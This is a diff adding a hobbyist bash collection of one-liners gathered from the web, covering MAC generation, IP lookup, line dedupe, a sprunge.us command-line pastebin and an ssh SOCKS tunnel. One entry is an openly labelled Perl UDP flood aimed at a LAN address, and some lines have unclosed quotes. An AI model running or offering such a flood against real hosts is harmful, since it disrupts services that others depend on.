@@ -1,0 +1,32 @@
+#!/bin/bash
+#
+# a mini-collection of 1 (maybe more) line(s) of code
+# that do random/cool/useful/not useful stuff
+#
+# mainly found on the net
+# so nothing original,
+# problem haters?
+#
+
+#random mac generator
+openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
+
+#prints your ip and country
+lynx -dump  www.ip-address.org | grep 'My IP Location:'
+#prints ip, country, isp and the rest in the line
+lynx -dump www.ip-address.org | grep "My IP Address:\\|My IP Host:\\|City:\\|Country:\\|City Lat/Lon:\\|ISP: 
+#use this for a notification box in the right upper corner of the screen
+notify-send "Your ip is" "`wget -qO- http://whatismyip.org/`"
+
+#perl 1line dos attack - maybe good in a lan attack, didnt prove efficient for me - attacks port port 80 on 192.168.0.14
+perl -e 'use Socket; socket(rtfm, PF_INET, SOCK_DGRAM, 0); for (;;) { send(rtfm, 0, 0, sockaddr_in(80, inet_aton("192.168.0.14"))); }
+
+#prints the file without duplicate lines
+awk '! a[$0]++' file 
+
+#command line pastebin - instead of 'command' use any bash command and its output will be pasted on sprunge.us
+command | curl -F 'sprunge=<-' http://sprunge.us 
+
+#ssh tunnel
+ssh -fND localhost:1080 user@remotehost 
+
